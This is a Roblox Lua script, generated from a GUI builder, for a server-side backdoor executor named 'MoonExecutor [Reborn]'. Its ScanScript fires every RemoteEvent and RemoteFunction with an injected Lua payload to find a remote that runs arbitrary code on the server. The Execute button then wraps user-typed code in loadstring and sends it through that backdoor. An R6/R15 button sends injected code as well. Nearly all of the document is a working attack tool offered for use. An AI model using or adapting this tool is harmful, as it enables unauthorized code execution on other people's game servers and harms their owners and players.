--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 

designed using localmaze gui creator
]=]

-- Instances: 26 | Scripts: 5 | Modules: 0 | Tags: 0
local LMG2L = {};

-- Players.KHAFIDZKTP.PlayerGui.ScreenGui
LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame
LMG2L["MenuInjectFrame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["MenuInjectFrame_2"]["BorderSizePixel"] = 0;
LMG2L["MenuInjectFrame_2"]["BackgroundColor3"] = Color3.fromRGB(6, 20, 57);
LMG2L["MenuInjectFrame_2"]["Size"] = UDim2.new(0.4043, 0, 0.39197, 0);
LMG2L["MenuInjectFrame_2"]["Position"] = UDim2.new(0.30586, 0, 0.29704, 0);
LMG2L["MenuInjectFrame_2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["MenuInjectFrame_2"]["Name"] = [[MenuInjectFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning 
LMG2L["Scanning _3"] = Instance.new("TextButton", LMG2L["MenuInjectFrame_2"]);
LMG2L["Scanning _3"]["TextWrapped"] = true;
LMG2L["Scanning _3"]["TextStrokeTransparency"] = 0;
LMG2L["Scanning _3"]["RichText"] = true;
LMG2L["Scanning _3"]["BorderSizePixel"] = 0;
LMG2L["Scanning _3"]["TextScaled"] = true;
LMG2L["Scanning _3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Scanning _3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["Scanning _3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Scanning _3"]["Size"] = UDim2.new(0.7913, 0, 0.58594, 0);
LMG2L["Scanning _3"]["Text"] = [[Scan Now]];
LMG2L["Scanning _3"]["Name"] = [[Scanning ]];
LMG2L["Scanning _3"]["Position"] = UDim2.new(0.11304, 0, 0.21875, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UICorner
LMG2L["UICorner_4"] = Instance.new("UICorner", LMG2L["Scanning _3"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
LMG2L["ScanScript_5"] = Instance.new("LocalScript", LMG2L["Scanning _3"]);
LMG2L["ScanScript_5"]["Name"] = [[ScanScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UIStroke
LMG2L["UIStroke_6"] = Instance.new("UIStroke", LMG2L["Scanning _3"]);
LMG2L["UIStroke_6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_6"]["Color"] = Color3.fromRGB(227, 12, 237);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UICorner
LMG2L["UICorner_7"] = Instance.new("UICorner", LMG2L["MenuInjectFrame_2"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIAspectRatioConstraint
LMG2L["UIAspectRatioConstraint_8"] = Instance.new("UIAspectRatioConstraint", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIAspectRatioConstraint_8"]["AspectRatio"] = 1.79688;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Reborns
LMG2L["Reborns_9"] = Instance.new("TextLabel", LMG2L["MenuInjectFrame_2"]);
LMG2L["Reborns_9"]["TextWrapped"] = true;
LMG2L["Reborns_9"]["BorderSizePixel"] = 0;
LMG2L["Reborns_9"]["TextScaled"] = true;
LMG2L["Reborns_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Reborns_9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["Reborns_9"]["TextColor3"] = Color3.fromRGB(255, 24, 190);
LMG2L["Reborns_9"]["BackgroundTransparency"] = 1;
LMG2L["Reborns_9"]["Size"] = UDim2.new(0, 132, 0, 50);
LMG2L["Reborns_9"]["Text"] = [[[REBORN]]];
LMG2L["Reborns_9"]["Name"] = [[Reborns]];
LMG2L["Reborns_9"]["Position"] = UDim2.new(0, 164, 0, 208);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.DraggingScript
LMG2L["DraggingScript_a"] = Instance.new("LocalScript", LMG2L["MenuInjectFrame_2"]);
LMG2L["DraggingScript_a"]["Name"] = [[DraggingScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIStroke
LMG2L["UIStroke_b"] = Instance.new("UIStroke", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIStroke_b"]["Color"] = Color3.fromRGB(255, 0, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.MoonExecutorText
LMG2L["MoonExecutorText_c"] = Instance.new("TextLabel", LMG2L["MenuInjectFrame_2"]);
LMG2L["MoonExecutorText_c"]["TextWrapped"] = true;
LMG2L["MoonExecutorText_c"]["TextStrokeTransparency"] = 0;
LMG2L["MoonExecutorText_c"]["BorderSizePixel"] = 0;
LMG2L["MoonExecutorText_c"]["TextScaled"] = true;
LMG2L["MoonExecutorText_c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MoonExecutorText_c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["MoonExecutorText_c"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
LMG2L["MoonExecutorText_c"]["BackgroundTransparency"] = 1;
LMG2L["MoonExecutorText_c"]["Size"] = UDim2.new(0.99565, 0, 0.17969, 0);
LMG2L["MoonExecutorText_c"]["Text"] = [[MoonExecutor ]];
LMG2L["MoonExecutorText_c"]["Name"] = [[MoonExecutorText]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame
LMG2L["ExecutorFrame_d"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["ExecutorFrame_d"]["Visible"] = false;
LMG2L["ExecutorFrame_d"]["BorderSizePixel"] = 0;
LMG2L["ExecutorFrame_d"]["BackgroundColor3"] = Color3.fromRGB(0, 24, 36);
LMG2L["ExecutorFrame_d"]["Size"] = UDim2.new(0, 608, 0, 354);
LMG2L["ExecutorFrame_d"]["Position"] = UDim2.new(0, 270, 0, 140);
LMG2L["ExecutorFrame_d"]["Name"] = [[ExecutorFrame]];
LMG2L["ExecutorFrame_d"]["BackgroundTransparency"] = 0.01;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.UICorner
LMG2L["UICorner_e"] = Instance.new("UICorner", LMG2L["ExecutorFrame_d"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.MainBox
LMG2L["MainBox_f"] = Instance.new("TextBox", LMG2L["ExecutorFrame_d"]);
LMG2L["MainBox_f"]["Name"] = [[MainBox]];
LMG2L["MainBox_f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["MainBox_f"]["BorderSizePixel"] = 0;
LMG2L["MainBox_f"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["MainBox_f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["MainBox_f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["MainBox_f"]["MultiLine"] = true;
LMG2L["MainBox_f"]["PlaceholderText"] = [[MADE BY KHAFIDZKTP  [REBORN]]];
LMG2L["MainBox_f"]["Size"] = UDim2.new(0, 480, 0, 230);
LMG2L["MainBox_f"]["Position"] = UDim2.new(0, 66, 0, 52);
LMG2L["MainBox_f"]["Text"] = [[]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.MainBox.UICorner
LMG2L["UICorner_10"] = Instance.new("UICorner", LMG2L["MainBox_f"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.R6Button
LMG2L["R6Button_11"] = Instance.new("TextButton", LMG2L["ExecutorFrame_d"]);
LMG2L["R6Button_11"]["TextWrapped"] = true;
LMG2L["R6Button_11"]["BorderSizePixel"] = 0;
LMG2L["R6Button_11"]["TextScaled"] = true;
LMG2L["R6Button_11"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["R6Button_11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["R6Button_11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Balthazar.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["R6Button_11"]["Size"] = UDim2.new(0, 80, 0, 32);
LMG2L["R6Button_11"]["Text"] = [[R6]];
LMG2L["R6Button_11"]["Name"] = [[R6Button]];
LMG2L["R6Button_11"]["Position"] = UDim2.new(0, 192, 0, 298);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.R6Button.UICorner
LMG2L["UICorner_12"] = Instance.new("UICorner", LMG2L["R6Button_11"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.R6Button.UIGradient
LMG2L["UIGradient_13"] = Instance.new("UIGradient", LMG2L["R6Button_11"]);
LMG2L["UIGradient_13"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 255, 29)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(53, 53, 53))};


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.R6Button.MainR6
LMG2L["MainR6_14"] = Instance.new("LocalScript", LMG2L["R6Button_11"]);
LMG2L["MainR6_14"]["Name"] = [[MainR6]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.TextTitle
LMG2L["TextTitle_15"] = Instance.new("TextLabel", LMG2L["ExecutorFrame_d"]);
LMG2L["TextTitle_15"]["TextWrapped"] = true;
LMG2L["TextTitle_15"]["TextStrokeTransparency"] = 0;
LMG2L["TextTitle_15"]["BorderSizePixel"] = 0;
LMG2L["TextTitle_15"]["TextScaled"] = true;
LMG2L["TextTitle_15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextTitle_15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["TextTitle_15"]["TextColor3"] = Color3.fromRGB(22, 5, 255);
LMG2L["TextTitle_15"]["BackgroundTransparency"] = 1;
LMG2L["TextTitle_15"]["Size"] = UDim2.new(0, 330, 0, 64);
LMG2L["TextTitle_15"]["Text"] = [[MoonExecutor [Reborn]]];
LMG2L["TextTitle_15"]["Name"] = [[TextTitle]];
LMG2L["TextTitle_15"]["Position"] = UDim2.new(0, 144, 0, -10);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.ExecuterButton
LMG2L["ExecuterButton_16"] = Instance.new("TextButton", LMG2L["ExecutorFrame_d"]);
LMG2L["ExecuterButton_16"]["TextWrapped"] = true;
LMG2L["ExecuterButton_16"]["BorderSizePixel"] = 0;
LMG2L["ExecuterButton_16"]["TextScaled"] = true;
LMG2L["ExecuterButton_16"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["ExecuterButton_16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ExecuterButton_16"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["ExecuterButton_16"]["Size"] = UDim2.new(0, 80, 0, 32);
LMG2L["ExecuterButton_16"]["Text"] = [[Execute]];
LMG2L["ExecuterButton_16"]["Name"] = [[ExecuterButton]];
LMG2L["ExecuterButton_16"]["Position"] = UDim2.new(0, 80, 0, 298);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.ExecuterButton.UICorner
LMG2L["UICorner_17"] = Instance.new("UICorner", LMG2L["ExecuterButton_16"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.ExecuterButton.MainExecute
LMG2L["MainExecute_18"] = Instance.new("LocalScript", LMG2L["ExecuterButton_16"]);
LMG2L["MainExecute_18"]["Name"] = [[MainExecute]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.ExecuterButton.UIGradient
LMG2L["UIGradient_19"] = Instance.new("UIGradient", LMG2L["ExecuterButton_16"]);
LMG2L["UIGradient_19"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.DraggingScript
LMG2L["DraggingScript_1a"] = Instance.new("LocalScript", LMG2L["ExecutorFrame_d"]);
LMG2L["DraggingScript_1a"]["Name"] = [[DraggingScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
local function C_5()
	local script = LMG2L["ScanScript_5"];
	local button = script.Parent	
	local player = game.Players.LocalPlayer	
	
	local isScanning = false	
	
	local function runRemote(remote, data)	
		if remote:IsA("RemoteEvent") then	
			remote:FireServer(data)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function() remote:InvokeServer(data) end)	
		end	
	end	
	
	local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}	
	local function generateName(length)	
		local text = ""	
		for i = 1, length do	
			text = text .. alphabet[math.random(1, #alphabet)]	
		end	
		return text	
	end	
	
	local function findBackdoor()	
		local remotes = {}	
	
		local protected = game:GetService("ReplicatedStorage"):FindFirstChild("lh" .. game.PlaceId / 6666 * 1337 * game.PlaceId)	
		if protected and protected:IsA("RemoteFunction") then	
			local code = generateName(math.random(12, 30))	
			task.spawn(function()	
				protected:InvokeServer("lalol", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			end)	
			remotes[code] = protected	
		end	
	
		for _, remote in game:GetDescendants() do	
			if not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction") then continue end	
			if string.split(remote:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then continue end	
	
			local rs = game:GetService("ReplicatedStorage")	
			if remote.Parent == rs or remote.Parent.Parent == rs or remote.Parent.Parent.Parent == rs then	
				if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then continue end	
				if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then continue end	
				if remote.Parent.Name == "DefaultChatSystemChatEvents" then continue end	
			end	
	
			local code = generateName(math.random(12, 30))	
			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			remotes[code] = remote	
		end	
	
		for i = 1, 100 do	
			for code, remote in remotes do	
				if workspace:FindFirstChild(code) then	
					return remote	
				end	
			end	
			task.wait()	
		end	
	
		return nil	
	end	
	
	button.MouseButton1Click:Connect(function()	
		if isScanning then return end	
		isScanning = true	
	
		button.TextColor3 = Color3.fromRGB(255, 255, 255)	
	
		local startTime = tick()	
		task.spawn(function()	
			while isScanning and (tick() - startTime) < 5 do	
				button.Text = "Scan." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan.." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan..." task.wait(0.4)	
			end	
		end)	
	
		local backdoor = findBackdoor()	
	
		local screenGui = button:FindFirstAncestorOfClass("ScreenGui")	
		local mainFrame = screenGui and screenGui:FindFirstChild("ExecutorFrame")	
		local menuInjectFrame = button.Parent	
	
		isScanning = false	
	
		if backdoor and mainFrame then	
			_G.MoonBackdoor = backdoor	
	
			button.Text = "Found!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
	
			task.wait(0.5)	
	
			-- Pindah ke CoreGui biar tidak hilang saat respawn	
			pcall(function()	
				screenGui.ResetOnSpawn = false	
				screenGui.Parent = game:GetService("CoreGui")	
			end)	
	
			mainFrame.Visible = true	
			menuInjectFrame.Visible = false	
	
			local hint = Instance.new("Hint")	
			hint.Text = "Thanks for using my executor! | By KHAFIDZKTP"	
			hint.Parent = player.Character	
	
			task.wait(100)	
			hint:Destroy()	
		else	
			button.TextColor3 = Color3.fromRGB(255, 0, 0)	
			if not backdoor then	
				button.Text = "No Backdoor Found :("	
			else	
				button.Text = "MainFrame Not Found :("	
			end	
		end	
	end)	
end;
task.spawn(C_5);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.DraggingScript
local function C_a()
	local script = LMG2L["DraggingScript_a"];
	local frame = script.Parent -- MainFrame	
	local UIS = game:GetService("UserInputService")	
	
	local dragging = false	
	local dragStart, startPos	
	
	frame.InputBegan:Connect(function(input)	
		if input.UserInputType == Enum.UserInputType.MouseButton1 	
			or input.UserInputType == Enum.UserInputType.Touch then	
			dragging = true	
			dragStart = input.Position	
			startPos = frame.Position	
	
			input.Changed:Connect(function()	
				if input.UserInputState == Enum.UserInputState.End then	
					dragging = false	
				end	
			end)	
		end	
	end)	
	
	UIS.InputChanged:Connect(function(input)	
		if dragging and (	
			input.UserInputType == Enum.UserInputType.MouseMovement or 	
			input.UserInputType == Enum.UserInputType.Touch	
		) then	
			local delta = input.Position - dragStart	
			frame.Position = UDim2.new(	
				startPos.X.Scale, startPos.X.Offset + delta.X,	
				startPos.Y.Scale, startPos.Y.Offset + delta.Y	
			)	
		end	
	end)	
end;
task.spawn(C_a);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.R6Button.MainR6
local function C_14()
	local script = LMG2L["MainR6_14"];
	local button = script.Parent	
	local player = game.Players.LocalPlayer	
	local isR6 = true -- mulai dari R6	
	
	local function setRigType(rigType)	
		local backdoor = _G.MoonBackdoor	
		if not backdoor then	
			button.Text = "No Backdoor!"	
			task.wait(1)	
			button.Text = isR6 and "R6" or "R15"	
			return	
		end	
	
		local code = "local plr = game:GetService('Players'):FindFirstChild('" .. player.Name .. "') "	
			.. "if plr then "	
			.. "plr.CharacterAdded:Wait() "	
			.. "end "	
			.. "local Players = game:GetService('Players') "	
			.. "local plr2 = Players:FindFirstChild('" .. player.Name .. "') "	
			.. "if plr2 then "	
			.. "plr2:LoadCharacter() "	
			.. "end"	
	
		-- Set RigType via StarterPlayer	
		local rigCode	
		if rigType == "R6" then	
			rigCode = "game:GetService('StarterPlayer').CharacterUseJumpPower = true "	
				.. "game.Players:FindFirstChild('" .. player.Name .. "').Character:FindFirstChildOfClass('Humanoid').RigType = Enum.HumanoidRigType.R6"	
		else	
			rigCode = "game.Players:FindFirstChild('" .. player.Name .. "').Character:FindFirstChildOfClass('Humanoid').RigType = Enum.HumanoidRigType.R15"	
		end	
	
		if backdoor:IsA("RemoteEvent") then	
			backdoor:FireServer(rigCode)	
		elseif backdoor:IsA("RemoteFunction") then	
			task.spawn(function() backdoor:InvokeServer(rigCode) end)	
		end	
	end	
	
	button.MouseButton1Click:Connect(function()	
		isR6 = not isR6	
	
		if isR6 then	
			button.Text = "R6"	
			button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)	
			setRigType("R6")	
		else	
			button.Text = "R15"	
			button.BackgroundColor3 = Color3.fromRGB(200, 100, 0)	
			setRigType("R15")	
		end	
	end)	
end;
task.spawn(C_14);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.ExecuterButton.MainExecute
local function C_18()
	local script = LMG2L["MainExecute_18"];
	local button = script.Parent	
	local mainFrame = button.Parent	
	local coderBox = mainFrame:WaitForChild("MainBox") -- ✅ FIX	
	local player = game.Players.LocalPlayer	
	
	local function runRemote(remote, code)	
		if remote:IsA("RemoteEvent") then	
			remote:FireServer(code)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function()	
				local ok, result = pcall(function()	
					return remote:InvokeServer(code)	
				end)	
				if ok and result ~= nil then	
					warn("[MoonExecutor] Response: " .. tostring(result))	
				end	
			end)	
		end	
	end	
	
	local function processCode(raw)	
		local trimmed = raw:match("^%s*(.-)%s*$")	
	
		if trimmed:match("^require%s*%(") then	
			return trimmed	
		end	
	
		if trimmed:match("^loadstring%s*%(") then	
			return trimmed	
		end	
	
		local escaped = trimmed	
			:gsub("\\", "\\\\")	
			:gsub('"', '\\"')	
			:gsub("\n", "\\n")	
			:gsub("\r", "")	
	
		return 'loadstring("' .. escaped .. '")()'	
	end	
	
	local function setButton(text, color)	
		button.Text = text	
		button.TextColor3 = color	
	end	
	
	local debounce = false	
	
	button.MouseButton1Click:Connect(function()	
		if debounce then return end	
	
		local backdoor = _G.MoonBackdoor	
	
		if not backdoor then	
			setButton("No Backdoor!", Color3.fromRGB(255, 80, 80))	
			task.wait(1.5)	
			setButton("Execute", Color3.fromRGB(255, 255, 255))	
			return	
		end	
	
		local raw = coderBox.Text	
		raw = raw:gsub("%%username%%", player.Name)	
	
		if raw:match("^%s*$") then	
			setButton("Empty!", Color3.fromRGB(255, 100, 100))	
			task.wait(1)	
			setButton("Execute", Color3.fromRGB(255, 255, 255))	
			return	
		end	
	
		debounce = true	
		setButton("Running...", Color3.fromRGB(255, 255, 0))	
	
		local code = processCode(raw)	
	
		local success = false	
		for i = 1, 3 do	
			local ok = pcall(function()	
				runRemote(backdoor, code)	
			end)	
			if ok then	
				success = true	
				break	
			end	
			task.wait(0.3)	
		end	
	
		task.wait(0.5)	
	
		if success then	
			setButton("Executed!", Color3.fromRGB(0, 255, 0))	
		else	
			setButton("Failed!", Color3.fromRGB(255, 50, 50))	
		end	
	
		task.wait(1.5)	
		setButton("Execute", Color3.fromRGB(255, 255, 255))	
		debounce = false	
	end)	
end;
task.spawn(C_18);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ExecutorFrame.DraggingScript
local function C_1a()
	local script = LMG2L["DraggingScript_1a"];
	local frame = script.Parent -- MainFrame	
	local UIS = game:GetService("UserInputService")	
	
	local dragging = false	
	local dragStart, startPos	
	
	frame.InputBegan:Connect(function(input)	
		if input.UserInputType == Enum.UserInputType.MouseButton1 	
			or input.UserInputType == Enum.UserInputType.Touch then	
			dragging = true	
			dragStart = input.Position	
			startPos = frame.Position	
	
			input.Changed:Connect(function()	
				if input.UserInputState == Enum.UserInputState.End then	
					dragging = false	
				end	
			end)	
		end	
	end)	
	
	UIS.InputChanged:Connect(function(input)	
		if dragging and (	
			input.UserInputType == Enum.UserInputType.MouseMovement or 	
			input.UserInputType == Enum.UserInputType.Touch	
		) then	
			local delta = input.Position - dragStart	
			frame.Position = UDim2.new(	
				startPos.X.Scale, startPos.X.Offset + delta.X,	
				startPos.Y.Scale, startPos.Y.Offset + delta.Y	
			)	
		end	
	end)	
end;
task.spawn(C_1a);

return LMG2L["ScreenGui_1"], require;
